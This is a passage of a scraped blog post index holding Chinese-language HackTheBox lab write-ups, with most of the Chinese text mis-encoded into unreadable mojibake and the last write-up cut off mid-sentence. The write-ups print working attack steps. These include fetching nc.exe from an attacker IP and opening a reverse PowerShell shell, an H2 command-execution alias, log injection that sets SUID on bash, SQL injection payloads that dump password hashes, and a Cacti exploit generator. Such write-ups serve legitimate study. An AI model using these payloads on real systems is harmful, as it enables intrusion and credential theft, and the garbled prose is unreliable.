ä¸ºwindowsé˜²ç«å¢™çš„åŸå› å¯¼è‡´ç«¯å£è½¬å‘å¤±è´¥\nå¯ä»¥ä½¿ç”¨chiselæ¥è¿›è¡Œç«¯å£è½¬å‘ï¼šRelease v1.7.4 Â· jpillora/chisel (github.com)\n#windows\rC:\\tmp\u0026gt;chisel_win.exe client 10.10.16.29:1234 R:9090:127.0.0.1:9090\r#kali\râ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Solarlab]\râ””â”€# ./chisel_1.7.4_linux_amd64 server --socks5 --reverse -p 1234 ä»£ç†æˆåŠŸ\nCVE-2023-32315 #\rå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç \nåœ¨openfireç•Œé¢ä¸­å¯ä»¥ä¸Šä¼ æ’ä»¶\nGithubï¼šmiko550/CVE-2023-32315: Openfire Console Authentication Bypass Vulnerability with RCE plugin (github.com)\nå°†ç¼–è¯‘å¥½çš„jaråŒ…è¿›è¡Œä¸Šä¼ ï¼Œè¿›å…¥server settings-\u0026gt;manage toolsï¼Œé»˜è®¤çš„å¯†ç æ˜¯ï¼š123\nç”±äºé¶æœºç›®å½•ä¸­æ²¡æœ‰**nc.exe**ï¼Œéœ€è¦è¿œç¨‹ä¸‹è½½ä¸€ä¸‹\ncurl 10.10.16.29/nc.exe -O nc.exe nc.exe 10.10.16.29 100 -e powershell.exe æˆåŠŸè¿›å…¥Openfireç›®å½•ï¼\nä½†æ˜¯æ— æ³•è¿›å…¥Administratorï¼Œåœ¨æ—¥å¿—æ–‡ä»¶ä¸­å‘ç°adminçš„è´¦æˆ·\nåœ¨openfire.scriptä¸­ï¼Œå‘ç°äº†ç±»ä¼¼äºå¯†ç å“ˆå¸Œçš„ä¸œè¥¿\nCREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME)) INSERT INTO OFUSER VALUES(\u0026#39;admin\u0026#39;,\u0026#39;gjMoswpK+HakPdvLIvp6eLKlYh0=\u0026#39;,\u0026#39;9MwNQcJ9bF4YeyZDdns5gvXp620=\u0026#39;,\u0026#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x\u0026#39;,4096,NULL,\u0026#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#39;,\u0026#39;Administrator\u0026#39;,\u0026#39;admin@solarlab.htb\u0026#39;,\u0026#39;001700223740785\u0026#39;,\u0026#39;0\u0026#39;) ä¸¤è€…ç›¸å¯¹æ¯”\nsaltï¼šyidQk5Skw11QJWTBAloAb28lYHftqa0x\rencryptpassï¼šbecb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 å¹¶ä¸”æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªèƒ½å¤Ÿè¿›è¡Œè§£å¯†çš„å·¥å…·\nGithubï¼šjas502n/OpenFire_Decrypt: OpenFire (github.com)\nå¾—åˆ°äº†Administratorçš„å¯†ç ï¼\nä½¿ç”¨impack-smbexecè¿œç¨‹æ‰§è¡Œ\næ‹¿åˆ°root.txt!\nSummary #\råœ¨meterpreterçš„protfwdç«¯å£è½¬å‘é‚£é‡Œï¼Œè¿˜æ˜¯ä¸å¤ªç†è§£ä¸ºä»€ä¹ˆä¸èƒ½è½¬å‘æˆåŠŸï¼Œåè€Œè¦å€ŸåŠ©å…¶ä»–çš„EXEæ–‡ä»¶æ¥è¿›è¡Œå»ºç«‹éš§é“ã€‚\nå…³äºsmbexecçš„æ–‡ç« ï¼šSMBExecï¼šçº¢é¢åˆ†æï¼ˆç¬¬ 2 éƒ¨åˆ†ï¼‰ (stacktitan.com)\nä¸ºä»€ä¹ˆä¸èƒ½åœ¨smbexecä¸­æ‰§è¡ŒCDæ“ä½œï¼Ÿæ­¤æ–‡ç« ä¸­æåˆ°äº†ï¼šsmbexecå¹¶ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„äº¤äº’å¼SHELLï¼Œè¿è¡Œçš„æ¯ä¸ªå‘½ä»¤éƒ½ä¼šå¯¼è‡´ Windows æœåŠ¡å’Œå‘½ä»¤ shell çš„é‡æ–°æ‰§è¡Œï¼Œä»¥åŠæ–°çš„æ‰¹å¤„ç†æ–‡ä»¶å’Œè¾“å‡ºæ–‡ä»¶\nåé¢çš„æ–‡ç« ä¸­å¯èƒ½ä¼šå¯¹Impacketçš„ç›¸å…³è„šæœ¬è¿›è¡Œè¯¦ç»†è§£æã€‚\n","date":"2024-09-20","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-solarlab/","section":"Posts","summary":"","title":"HTB-Solarlab","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap Scan #\rå¼€æ”¾ç«¯å£ï¼š22ã€80ã€8080\ncaption.htb:80ğŸ‘‡æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢\ncaption.htb:8080ğŸ‘‡æ³¨æ„åˆ°æ˜¯ä¸€ä¸ªGitbucketçš„æœåŠ¡\nå…¶ä¸­GitBucketå¯ä»¥ä½¿ç”¨å¼±å¯†ç ç™»å…¥ï¼šroot-root\nå¹¶ä¸”å‘ç°ä¸¤ä¸ªä»“åº“ï¼šLogserviceï¼ŒPortal\nåœ¨Caption-Portalä»“åº“çš„æäº¤å†å²ä¸­ï¼Œå‘ç°äº†æ³„éœ²çš„ç”¨æˆ·margoï¼Œä»¥åŠå¯†ç \nç™»å½•80ç«¯å£ï¼Œä½†å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿ï¼ŒLogsè·¯ç”±ç”šè‡³æ˜¯403Forbidden\nSQL RCE #\råœ¨Gitbucketçš„ç®¡ç†ç•Œé¢å‘ç°äº†å¯ä»¥æ‰§è¡ŒSQLè¯­å¥çš„éƒ¨åˆ†\nå¹¶ä¸”æš´éœ²å‡ºäº†æ˜¯H2æ•°æ®åº“\nGoogleæœç´¢ç»“æœï¼šChaining Vulnerabilities in H2 Database for RCE | by Nairuz Abulhul | R3d Buck3T | Medium\nCREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {\rjava.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;);\rreturn s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$; æ‰§è¡Œè¿™æ®µå‘½ä»¤ç»™execèµ·ä¸ªåˆ«åï¼Œç„¶åå°±èƒ½è°ƒç”¨\nåœ¨margoçš„æ–‡ä»¶å¤¹ä¸‹å‘ç°äº†sshç§é’¥æ–‡ä»¶\nå°†å…¶å†™å…¥æœ¬åœ°kaliï¼Œæ³¨æ„æ ¼å¼åŒ–ä»¥åŠæƒé™è®¾ç½®ä¸º600\nå¾—åˆ°user.txt\nPrivilege Escalation #\rå›åˆ°Gitbucketé¡µé¢çš„å¦ä¸€ä¸ªLogserviceä»“åº“ï¼Œå¯ä»¥å‘ç°æ˜¯ç”¨Goè¯­è¨€å†™çš„\nå¹¶ä¸”è¿˜å¼•å…¥äº†thrift\nå¹¶ä¸”æ˜¯è¿è¡Œåœ¨9090ç«¯å£ä¸Š\nå°†LogServiceè¿›è¡Œgit cloneåˆ°margoç›®å½•ä¸‹\n#é¶æœºæ‰§è¡Œå¼€å¯æœåŠ¡\rthrift --gen py log_service.thrift\r#ncä¼ è¾“æ–‡ä»¶\rmargo@caption:~/Logservice$ nc -q 0 10.10.16.29 4321 \u0026lt; log_service.thrift\râ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Caption]\râ””â”€# nc -lnvp 4321 \u0026gt; log_service.thrift\r#kaliå®‰è£…åº“\râ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Caption]\râ””â”€# pip3 install thrift å°†é¶æœºç«¯å£è½¬å‘åˆ°kaliä¸Š\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Caption]\râ””â”€# ssh -i margo.key -L 9090:127.0.0.1:9090 margo@10.10.11.33 å†™å…¥æ¶æ„æ—¥å¿—æ–‡ä»¶\nmargo@caption:~/Logservice$ cat /tmp/evil.log 127.0.0.1 \u0026#34;user-agent\u0026#34;:\u0026#34;\u0026#39;; /bin/bash /tmp/hyh.sh #\u0026#34;\rmargo@caption:~/Logservice$ cat /tmp/hyh.sh chmod +s /bin/bash å›åˆ°kali\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Caption]\râ””â”€# thrift -r --gen py log_service.thrift å†™å…¥pyæ–‡ä»¶\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Caption/gen-py]\râ””â”€# cat client.py from thrift.transport import TSocket\rfrom thrift.transport import TTransport\rfrom thrift.protocol import TBinaryProtocol\rfrom log_service import LogService\rdef main():\rtransport = TSocket.TSocket(\u0026#39;127.0.0.1\u0026#39;, 9090)\rtransport = TTransport.TBufferedTransport(transport)\rprotocol = TBinaryProtocol.TBinaryProtocol(transport)\rclient = LogService.Client(protocol)\rtransport.open()\rtry:\rresponse = client.ReadLogFile(\u0026#34;/tmp/evil.log\u0026#34;)\rexcept Exception as e:\rprint(f\u0026#34;Error: {e}\u0026#34;)\rfinally:\rtransport.close()\rif __name__ == \u0026#34;__main__\u0026#34;:\rmain() ä¿å­˜å¥½åæœ€åæ‰§è¡Œclient.py\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Caption/gen-py]\râ””â”€# python client.py å¾—åˆ°root.txt\nSummary #\rä¸ªäººæ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡\nææƒéƒ¨åˆ†ä¸»è¦çš„æ€è·¯æ˜¯å†™å…¥æ¶æ„çš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åé€šè¿‡thriftçš„è¿æ¥è®©å®¢æˆ·ç«¯ä¸»åŠ¨æ‰§è¡Œbashçš„æƒé™æå‡\nä¸è¿‡æˆ‘æœç´¢äº†ä¸€ä¸‹å¥½åƒå¹¶æ²¡æœ‰thriftçš„ç›¸å…³ææƒæ“ä½œï¼Œè¿™åº”è¯¥æ˜¯thriftçš„ç‰¹æ€§ï¼Ÿä¸çŸ¥é“æ˜¯å¦æ˜¯thriftçš„æ“ä½œéƒ½å…·æœ‰æœ€é«˜æƒé™ã€‚\nç›¸å…³çš„writeup\nHacktheBox-Caption | å¿ƒæµ (natro92.fun)\nHackTheBox: Caption | Str4ngerX (loghmariala.github.io)\n","date":"2024-09-18","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-caption/","section":"Posts","summary":"","title":"HTB-Caption","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rDirsearch #\ræ‰¾åˆ°ä¸€äº›æ•æ„Ÿæ–‡ä»¶\nè¿›å…¥login.phpï¼Œå‘ç°pluckçš„ç‰ˆæœ¬æ˜¯4.7.18\nCVE-2023-50564 #\ræŸ¥è¯¢ç›¸å…³æ¼æ´ä¹‹åï¼Œå‘ç°RCEéœ€è¦å…ˆä¸Šä¼ æ–‡ä»¶ã€‚\nè¿›å…¥3000ç«¯å£\næ‰¾åˆ°pass.phpï¼Œå¹¶å°è¯•è§£å¯†\nç™»å½•æˆåŠŸï¼Œè¿›å…¥installmodule\nè¿™é‡ŒæŠŠåå¼¹shellæ–‡ä»¶è¿›è¡Œå‹ç¼©åä¸Šä¼ \nphp-reverse-shell/php-reverse-shell.php at master Â· pentestmonkey/php-reverse-shell (github.com)\nå¾—åˆ°åå¼¹shell\nå­˜åœ¨ä¸¤ä¸ªç”¨æˆ·ï¼Œgitå’Œjuniorï¼Œå…¶ä¸­juniorèƒ½è¿›å»ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»å–user.txt\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; å‡çº§shellï¼Œç”¨ä¹‹å‰çš„å¯†ç å°è¯•åˆ‡æ¢juniorç”¨æˆ·ï¼Œå¾—åˆ°user.txt\nPrivilege Escalation #\rå°è¯•ä¸‹è½½è¿™ä¸ªpdfæ–‡ä»¶\nä½¿ç”¨ncè¿æ¥ä¼ è¾“\n#é¶æœº\rjunior@greenhorn:~$ nc -q 0 10.10.16.29 4321 \u0026lt; \u0026#39;Using OpenVAS.pdf\u0026#39;\r#kali\rnc -lnvp 4321 \u0026gt; file.pdf æ‰“å¼€è¿™ä¸ªpdfï¼Œå‘ç°å¯†ç è¢«æ‰“äº†ç \nGithubå·¥å…·ï¼šspipm/Depix: Recovers passwords from pixelized screenshots (github.com)\npython3 depix.py -p /home/kali/Pictures/ma.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png å‹‰å¼ºèƒ½çœ‹å‡ºæ˜¯ï¼šsidefromsidetheothersidesidefromsidetheotherside\nSummary #\råšåˆ°è¿™ä¸ªé¢˜ç›®æ‰çŸ¥é“æœ‰Depixè¿™ç§æ¶ˆé™¤é©¬èµ›å…‹çš„ä¸œè¥¿ï¼Œæ„Ÿè§‰å¾ˆå‰å®³\næ•´ä½“æ¥è¯´æ¯”è¾ƒå¸¸è§„\n","date":"2024-09-17","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-greenhorn/","section":"Posts","summary":"","title":"HTB-Greenhorn","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Basic Scan #\rNmap #\rnmap -A -O monitorsthree.htb å¼€æ”¾ç«¯å£ï¼š22ã€80ã€8084\nWeb serverï¼šnginx 1.18.0\nDirsearch #\rdirsearch -u monitorsthree.htb -t 50 å‘ç°ï¼šlogin.php\nSubdomain Fuzzing #\rffuf -w main.txt -u http://monitorsthree.htb -H \u0026#34;Host:FUZZ.monitorsthree.htb\u0026#34; -ac å‘ç°å­åŸŸåï¼Œä»¥åŠç‰ˆæœ¬ä¿¡æ¯\nç»è¿‡æœå¯»ä¹‹åå¹¶æ²¡æœ‰å¯ä»¥ç›´æ¥ä¸ç™»é™†çš„poc\nSQL Injection #\råœ¨æ‰¾å›å¯†ç é¡µé¢å‘ç°adminå’Œadmin' and 1=1#çš„ç»“æœéƒ½æ˜¯é€šè¿‡ï¼Œè€Œå…¶ä»–çš„ä¸å­˜åœ¨çš„ç”¨æˆ·ååˆ™æŠ¥é”™\nè¿™é‡ŒçŒœæµ‹æ˜¯æœ‰sqlæ³¨å…¥æ¼æ´ï¼Œå°†æŠ“çš„åŒ…å†™å…¥ä¸€ä¸ªæ–‡ä»¶\nsqlmap -r monitors.req -dbms=mysql --dump å¯ä»¥çœ‹å‡ºç¡®å®æ˜¯å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œè¿™é‡Œæµ‹å‡ºæ˜¯æ—¶é—´ç›²æ³¨\nç”±äºSqlmapå®åœ¨è·‘çš„æ˜¯å¤ªæ…¢äº†ï¼Œå› ä¸ºæœ‰æŠ¥é”™ä¿¡æ¯ï¼Œé¡ºæ‰‹å°±æµ‹äº†ä¸€ä¸‹ï¼Œå‘ç°èƒ½ç›´æ¥æŠ¥é”™æ³¨å…¥\nadmin\u0026#39; and extractvalue(1,concat(\u0026#39;~\u0026#39;,database()))# admin\u0026#39; and extractvalue(1,concat(\u0026#39;~\u0026#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())))# æŠ¥é”™ä¿¡æ¯é•¿åº¦æœ‰é™ï¼Œè¿™é‡Œä½¿ç”¨substirngæ¥æˆªå–\nadmin\u0026#39; AND extractvalue(1,concat(\u0026#39;~\u0026#39;,(SELECT SUBSTRING(GROUP_CONCAT(table_name),40,30) FROM information_schema.tables WHERE table_schema=database())))# å‘ç°ä¸€ä¸ªusersè¡¨\nadmin\u0026#39; AND extractvalue(1,concat(\u0026#39;~\u0026#39;,(SELECT SUBSTRING(GROUP_CONCAT(column_name),1,30) FROM information_schema.columns WHERE table_name=\u0026#39;users\u0026#39;)))# ç„¶åè·å–usernameå’Œpassword\nadmin\u0026#39; AND extractvalue(1,concat(\u0026#39;~\u0026#39;,(SELECT SUBSTRING(GROUP_CONCAT(username,\u0026#39;:\u0026#39;,password),1,30) FROM users)))# adminï¼š31a181c8372e3afc59dab863430610e8\nhashcat \u0026#39;31a181c8372e3afc59dab863430610e8\u0026#39; -m 0 /usr/share/wordlists/rockyou.txt ç„¶åå³å¯ç™»å½•cactiå­åŸŸå\nCVE-2024-25641 #\rå¦‚æœæ˜¯èƒ½å¤Ÿè¿›å…¥cactiçš„æƒ…å†µä¸‹ï¼Œæ˜¯æœ‰CVEå¯ä»¥åˆ©ç”¨çš„\nGithubï¼šRCE vulnerability when importing packages Â· Advisory Â· Cacti/cacti (github.com)\n\u0026lt;?php\r$xmldata = \u0026#34;\u0026lt;xml\u0026gt;\r\u0026lt;files\u0026gt;\r\u0026lt;file\u0026gt;\r\u0026lt;name\u0026gt;resource/test.php\u0026lt;/name\u0026gt;\r\u0026lt;data\u0026gt;%s\u0026lt;/data\u0026gt;\r\u0026lt;filesignature\u0026gt;%s\u0026lt;/filesignature\u0026gt;\r\u0026lt;/file\u0026gt;\r\u0026lt;/files\u0026gt;\r\u0026lt;publickey\u0026gt;%s\u0026lt;/publickey\u0026gt;\r\u0026lt;signature\u0026gt;\u0026lt;/signature\u0026gt;\r\u0026lt;/xml\u0026gt;\u0026#34;;\r$filedata = \u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34;;\r$keypair = openssl_pkey_new(); $public_key = openssl_pkey_get_details($keypair)[\u0026#34;key\u0026#34;]; openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);\r$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));\ropenssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);\rfile_put_contents(\u0026#34;test.xml\u0026#34;, str_replace(\u0026#34;\u0026lt;signature\u0026gt;\u0026lt;/signature\u0026gt;\u0026#34;, \u0026#34;\u0026lt;signature\u0026gt;\u0026#34;.base64_encode($signature).\u0026#34;\u0026lt;/signature\u0026gt;\u0026#34;, $data));\rsystem(\u0026#34;cat test.xml | gzip -9 \u0026gt; test.xml.gz; rm test.xml\u0026#34;);\r?\u0026gt; è¿è¡Œè¿™æ®µä»£ç ï¼Œä¼šç”Ÿæˆä¸€ä¸ªgzæ–‡ä»¶ï¼Œåœ¨cactié‡Œä¸Šä¼ \nå¯ä»¥çœ‹åˆ°å†™å…¥æˆåŠŸ\næ¥ä¸‹æ¥å‡†å¤‡åå¼¹shellï¼Œåªéœ€è¦ä¿®æ”¹ä¸€ä¸‹phpä»£ç é‡Œçš„å‚æ•°å³å¯\nåœ¨include ä¸‹çš„config.php ä¸­å‘ç°æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç \nå¹¶ä¸”é¶æœºåªå…è®¸å¯†é’¥ç™»å½•\nmysqlç™»å½•æ‹¿åˆ°marcusçš„å¯†ç å“ˆå¸Œ\nä½¿ç”¨hashcatçˆ†ç ´\nhashcat hash.txt -m 3200 /usr/share/wordlists/rockyou.txt ç”±äºä¸èƒ½ç”¨å¯†ç ç™»å½•ï¼Œå°±ç›´æ¥åœ¨åå¼¹shellé‡Œåˆ‡æ¢ç”¨æˆ·\nPrivilege Escalation #\rå°†ç§é’¥æ–‡ä»¶ä¿å­˜åˆ°kali\næƒé™æ”¹ä¸º600ï¼Œå³å¯sshç™»å½•\næŸ¥çœ‹å†…éƒ¨ç«¯å£æƒ…å†µ\næ·»åŠ ç«¯å£æ˜ å°„\nssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -i marcus.rsa æœç´¢ä¸€ä¸‹è¿™ä¸ªduplicate\nGithubï¼šä½¿ç”¨ DB Server-Passphrase ç»•è¿‡é‡å¤ç™»å½•èº«ä»½éªŒè¯ Â·é—®é¢˜ #5197 Â·duplicati/duplicati (github.com)\nå°†æ–‡ä»¶å¤¹ä¸­çš„sqliteæ–‡ä»¶ä¸‹è½½\nå‘ç°ç±»ä¼¼äºå¯†ç çš„ä¸œè¥¿ï¼Œè¿˜æœ‰ç›å€¼\næ ¹æ®æ­¤æ­¥éª¤é‡ç°\nvar saltedpwd = \u0026#39;59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a\u0026#39;; var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(\u0026#39;wDgyoYHEiXayJpfp3jE09CiTfnhlZKl//JzmoLhb8bw=\u0026#39;) + saltedpwd)).toString(CryptoJS.enc.Base64); console.log(noncedpwd); æˆåŠŸè¿›å…¥åå°\nå¹¶ä¸”è¿™é‡Œå¯ä»¥ä¸Šä¼ ä¸€äº›æ–‡ä»¶ï¼Œå¹¶ä¸”æ‰§è¡Œä¸€äº›ä»»åŠ¡\nå°†backupç›®æ ‡é€‰æ‹©ä¸º/marcusç›®å½•ï¼Œsource dataé€‰æ‹©ä¸ºrootä¸‹çš„txtæ–‡ä»¶\nç‚¹å‡»Run now ï¼Œç„¶åè¿›å…¥restore\nå³å¯è·å–åˆ°root.txt\nSummary #\ræœ€åææƒçš„éƒ¨åˆ†ï¼Œç†è®ºä¸Šæ¥è¯´èƒ½æŠŠmarcusçš„å…¬é’¥æ·»åŠ åˆ°/root/.sshä¸­çš„authorized_keysï¼Œä»è€Œå®ç°å¤–éƒ¨ä½¿ç”¨marcusçš„ç§é’¥ç™»å½•ä¸ºrootç”¨æˆ·ã€‚ï¼ˆä¸è¿‡è¿™é‡Œèƒ½ç›´æ¥è·å–åˆ°rootçš„flagï¼‰\nç›®å‰æˆ‘åšè¿‡çš„HTBé‡Œé¢ï¼ŒSQLæ³¨å…¥å¥½åƒè¿˜å¾ˆå°‘ï¼Œæœ¬é¢˜ä¸­å¯ä»¥ç”¨sqlmapï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨å°è¯•ï¼Œå› ä¸ºsqlmapä¸ä¸€å®šå‡†ç¡®ã€‚\n","date":"2024-09-12","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-monitorsthree/","section":"Posts","summary":"","title":"HTB-MonitorsThree","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Basic Scan #\rNmap #\rnmap -A -O blurry.htb å¼€æ”¾ç«¯å£ï¼š22ã€80\nWeb Serverï¼šnginx 1.18.0\nDirsearch #\rSubdomain Fuzzing #\rå­åŸŸåï¼šappã€filesã€chat\napp.blurry.htbğŸ‘‡\nchat.blurry.htbğŸ‘‡\nfiles.blurry.htbğŸ‘‡\nCVE-2024-24590 #\rGithubï¼šxffsec/CVE-2024-24590-ClearML-RCE-Exploit (github.com)\né¦–å…ˆè¦åœ¨æœ¬åœ°åˆå§‹åŒ–Clearml\nç…§ç€é¡ºåºï¼Œè®°å¾—åœ¨/etc/hostsä¸‹æ·»åŠ apiå­åŸŸå\nå¤åˆ¶å‡­è¯\nprojecté‡Œé¢æœ‰ä¸€ä¸ªBlack Swanæ¥ä½œä¸ºç›®æ ‡\nncç›‘å¬è·å¾—shell\nPrivilege Escalation #\rå‘ç°å…·æœ‰ç‰¹æ®Šæƒé™çš„æ–‡ä»¶\nå¯ä»¥ä½¿ç”¨evaluate_modelå»æ‰§è¡Œmodelsä¸‹çš„pthåç¼€æ–‡ä»¶\nè¿™ä¸ªæ€è·¯éå¸¸ç‰›bï¼šBlurry HTB Writeup (taipanbyte.ru)\nå› ä¸ºåœ¨evaluate_modelé‡Œè°ƒç”¨äº†/models/evaluate_model.py\ncat /usr/bin/evaluate_model\r#!/bin/bash\r# Evaluate a given model against our proprietary dataset.\r# Security checks against model file included.\rif [ \u0026#34;$#\u0026#34; -ne 1 ]; then\r/usr/bin/echo \u0026#34;Usage: $0 \u0026lt;path_to_model.pth\u0026gt;\u0026#34;\rexit 1\rfi\rMODEL_FILE=\u0026#34;$1\u0026#34;\rTEMP_DIR=\u0026#34;/opt/temp\u0026#34;\rPYTHON_SCRIPT=\u0026#34;/models/evaluate_model.py\u0026#34; /usr/bin/mkdir -p \u0026#34;$TEMP_DIR\u0026#34;\rfile_type=$(/usr/bin/file --brief \u0026#34;$MODEL_FILE\u0026#34;)\r# Extract based on file type\rif [[ \u0026#34;$file_type\u0026#34; == *\u0026#34;POSIX tar archive\u0026#34;* ]]; then\r# POSIX tar archive (older PyTorch format)\r/usr/bin/tar -xf \u0026#34;$MODEL_FILE\u0026#34; -C \u0026#34;$TEMP_DIR\u0026#34;\relif [[ \u0026#34;$file_type\u0026#34; == *\u0026#34;Zip archive data\u0026#34;* ]]; then\r# Zip archive (newer PyTorch format)\r/usr/bin/unzip -q \u0026#34;$MODEL_FILE\u0026#34; -d \u0026#34;$TEMP_DIR\u0026#34;\relse\r/usr/bin/echo \u0026#34;[!] Unknown or unsupported file format for $MODEL_FILE\u0026#34;\rexit 2\rfi\r/usr/bin/find \u0026#34;$TEMP_DIR\u0026#34; -type f \\( -name \u0026#34;*.pkl\u0026#34; -o -name \u0026#34;pickle\u0026#34; \\) -print0 | while IFS= read -r -d $\u0026#39;\\0\u0026#39; extracted_pkl; do\rfickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 \u0026#34;$extracted_pkl\u0026#34;)\rif /usr/bin/echo \u0026#34;$fickling_output\u0026#34; | /usr/bin/jq -e \u0026#39;select(.severity == \u0026#34;OVERTLY_MALICIOUS\u0026#34;)\u0026#39; \u0026gt;/dev/null; then\r/usr/bin/echo \u0026#34;[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted.\u0026#34;\r/bin/rm \u0026#34;$MODEL_FILE\u0026#34;\rbreak\rfi\rdone\r/usr/bin/find \u0026#34;$TEMP_DIR\u0026#34; -type f -exec /bin/rm {} +\r/bin/rm -rf \u0026#34;$TEMP_DIR\u0026#34;\rif [ -f \u0026#34;$MODEL_FILE\u0026#34; ]; then\r/usr/bin/echo \u0026#34;[+] Model $MODEL_FILE is considered safe. Processing...\u0026#34;\r/usr/bin/python3 \u0026#34;$PYTHON_SCRIPT\u0026#34; \u0026#34;$MODEL_FILE\u0026#34;\rfi è€Œåœ¨/models/evaluate_model.pyçš„ä»£ç æ˜¯è¿™æ ·çš„\ncat /models/e*\rimport torch\rimport torch.nn as nn\rfrom torchvision import transforms\rfrom torchvision.datasets import CIFAR10\rfrom torch.utils.data import DataLoader, Subset\rimport numpy as np\rimport sys\rclass CustomCNN(nn.Module):\rdef __init__(self):\rsuper(CustomCNN, self).__init__()\rself.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)\rself.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)\rself.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)\rself.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)\rself.fc2 = nn.Linear(in_features=128, out_features=10)\rself.relu = nn.ReLU()\rdef forward(self, x):\rx = self.pool(self.relu(self.conv1(x)))\rx = self.pool(self.relu(self.conv2(x)))\rx = x.view(-1, 32 * 8 * 8)\rx = self.relu(self.fc1(x))\rx = self.fc2(x)\rreturn x\rdef load_model(model_path):\rmodel = CustomCNN()\rstate_dict = torch.load(model_path)\rmodel.load_state_dict(state_dict)\rmodel.eval() return model\rdef prepare_dataloader(batch_size=32):\rtransform = transforms.Compose([\rtransforms.RandomHorizontalFlip(),\rtransforms.RandomCrop(32, padding=4),\rtransforms.ToTensor(),\rtransforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),\r])\rdataset = CIFAR10(root=\u0026#39;/root/datasets/\u0026#39;, train=False, download=False, transform=transform)\rsubset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))\rdataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)\rreturn dataloader\rdef evaluate_model(model, dataloader):\rcorrect = 0\rtotal = 0\rwith torch.no_grad(): for images, labels in dataloader:\routputs = model(images)\r_, predicted = torch.max(outputs.data, 1)\rtotal += labels.size(0)\rcorrect += (predicted == labels).sum().item()\raccuracy = 100 * correct / total\rprint(f\u0026#39;[+] Accuracy of the model on the test dataset: {accuracy:.2f}%\u0026#39;)\rdef main(model_path):\rmodel = load_model(model_path)\rprint(\u0026#34;[+] Loaded Model.\u0026#34;)\rdataloader = prepare_dataloader()\rprint(\u0026#34;[+] Dataloader ready. Evaluating model...\u0026#34;)\revaluate_model(model, dataloader)\rif __name__ == \u0026#34;__main__\u0026#34;:\rif len(sys.argv) \u0026lt; 2:\rprint(\u0026#34;Usage: python script.py \u0026lt;path_to_model.pth\u0026gt;\u0026#34;)\relse:\rmodel_path = sys.argv[1] # Path to the .pth file\rmain(model_path) å¯ä»¥çœ‹åˆ°evaluate_model.pyä¸­å¯¼å…¥äº†å‡ ä¸ªåŒ…\né»˜è®¤æƒ…å†µä¸‹ï¼ŒPython åœ¨å¯¼å…¥æ¨¡å—æ—¶ä¼šå…ˆæ£€æŸ¥å½“å‰å·¥ä½œç›®å½•æˆ–è„šæœ¬æ‰€åœ¨ç›®å½•ä¸‹æ˜¯å¦æœ‰åŒåæ–‡ä»¶æˆ–æ¨¡å—\nå¦‚æœ torch.py 